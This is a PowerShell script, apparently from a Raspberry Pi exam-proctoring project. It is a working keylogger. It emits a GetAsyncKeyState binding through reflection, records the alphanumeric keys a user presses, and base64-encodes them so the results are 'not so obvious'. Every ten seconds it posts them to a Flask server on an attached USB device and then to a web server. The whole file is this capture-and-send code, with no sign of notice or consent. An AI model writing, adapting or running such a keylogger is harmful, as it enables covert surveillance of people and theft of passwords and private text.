#---------------------------------------------------------------------------------------------------------------------
#                                                   Variables Definition
#---------------------------------------------------------------------------------------------------------------------
# Web server for processing string data
$sending_base = 'http://127.0.0.1:8080/app/process.php'
# Webserver for getting public key
$key = 'http://127.0.0.1:8080/app/RSA/public_rsa.key'

#---------------------------------------------------------------------------------------------------------------------
#                                                      Basic Functions
#---------------------------------------------------------------------------------------------------------------------
# Function: Determine if Raspberry Pi is connected to the PC
# Finding for USB with VID 1D6B. VID is the Vendor ID set by us when configuring composite mode on Raspberry Pi
function Is_Connected {
    $check = $null
    $check = Get-PnpDevice -PresentOnly | Where-Object { $_.InstanceId -match '^USB\\VID_1D6B' }

    if ($null -ne $check) {
        return 'FOUND'
    }
}

# Function: Encoding plaintext string to base64 encode so that the proctoring results are not so obvious when sending to Flask server
function Encode($data) {
    return [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($data))
}

#---------------------------------------------------------------------------------------------------------------------
#                                                    Initial Functions
#---------------------------------------------------------------------------------------------------------------------
# Retrieving public key from web server
$pub_key = Invoke-WebRequest -Uri $key -UseBasicParsing

# Sending public key to Pi's Flask server in JSON format
$key_data = @{PuK = Encode($($pub_key.ToString()))}
# Result is the UUID
$completed = $false

if (Is_Connected -ne $null) {
    try {
        $response = Invoke-WebRequest -Uri http://127.0.0.1:5000/ -Method POST -Body ($key_data | ConvertTo-Json) -ContentType 'application/json'
        $uuid = ($response.content | ConvertFrom-Json).uuid
        $completed = $true
    } catch {}
} else {break}

#---------------------------------------------------------------------------------------------------------------------
#                                                      Keystroke Function
#---------------------------------------------------------------------------------------------------------------------
function Capture_Keystrokes {
    [Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms') | Out-Null

    $LogBuffer = @()
    $LastWriteTime = Get-Date
    $BatchInterval = 10  # seconds
    $KeyState = @{}  # Hash table to track pressed keys

    $DynAssembly = New-Object System.Reflection.AssemblyName('Win32Lib')
    $AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('Win32Lib', $False)
    $TypeBuilder = $ModuleBuilder.DefineType('User32', 'Public, Class')

    $DllImportConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))
    $FieldArray = [Reflection.FieldInfo[]] @(
        [Runtime.InteropServices.DllImportAttribute].GetField('EntryPoint'),
        [Runtime.InteropServices.DllImportAttribute].GetField('ExactSpelling'),
        [Runtime.InteropServices.DllImportAttribute].GetField('SetLastError'),
        [Runtime.InteropServices.DllImportAttribute].GetField('PreserveSig'),
        [Runtime.InteropServices.DllImportAttribute].GetField('CallingConvention'),
        [Runtime.InteropServices.DllImportAttribute].GetField('CharSet')
    )

    $PInvokeMethod = $TypeBuilder.DefineMethod('GetAsyncKeyState', 'Public, Static', [Int16], [Type[]] @([Windows.Forms.Keys]))
    $FieldValueArray = [Object[]] @(
        'GetAsyncKeyState',
        $True,
        $False,
        $True,
        [Runtime.InteropServices.CallingConvention]::Winapi,
        [Runtime.InteropServices.CharSet]::Auto
    )
    $CustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor, @('user32.dll'), $FieldArray, $FieldValueArray)
    $PInvokeMethod.SetCustomAttribute($CustomAttribute)

    $ImportDll = $TypeBuilder.CreateType()

    while (1) {
        for ($TypeableChar = 1; $TypeableChar -le 254; $TypeableChar++) {
            $VirtualKey = $TypeableChar
            $KeyResult = $ImportDll::GetAsyncKeyState($VirtualKey)

            # If the key is pressed
            if (($KeyResult -band 0x8000) -eq 0x8000) {
                if (-not $KeyState.ContainsKey($VirtualKey) -or -not $KeyState[$VirtualKey]) {
                    $KeyState[$VirtualKey] = $true

                    # Log only alphanumeric characters
                    if ((($VirtualKey -ge 48 -and $VirtualKey -le 57) -or ($VirtualKey -ge 65 -and $VirtualKey -le 90) -or ($VirtualKey -ge 97 -and $VirtualKey -le 122))) {
                        $LogBuffer += [char]$VirtualKey
                    }
                }
            } else {
                $KeyState[$VirtualKey] = $false
            }
        }

        # Check connection status and send buffer every 10 seconds
        if ((Get-Date) -gt $LastWriteTime.AddSeconds($BatchInterval)) {
            if (Is_Connected -ne $null) {
                if ($LogBuffer.Length -gt 0) {
                    $LogBufferString = $LogBuffer -join ""
                    $encoded_content = Encode($LogBufferString)
                    $data = @{KS = $encoded_content}
                    $completed = $false

                    while (-not $completed) {
                        try {
                            $response = Invoke-WebRequest -Uri http://127.0.0.1:5000/ -Method POST -Body ($data | ConvertTo-Json) -ContentType 'application/json'
                            Write-Host "Sending data"
                            # Sending data to Webserver
                            Invoke-WebRequest -Uri $sending_base -UseBasicParsing -Method POST -Body ($response.content | ConvertTo-Json) -ContentType 'application/json'
                            $completed = $true
                        } catch {}
                    }

                    # Clear the buffer
                    $LogBuffer = @()
                    $LastWriteTime = Get-Date
                }
            } else {break}
        }
    }
}

# Start the keystroke capturing function in the foreground
Capture_Keystrokes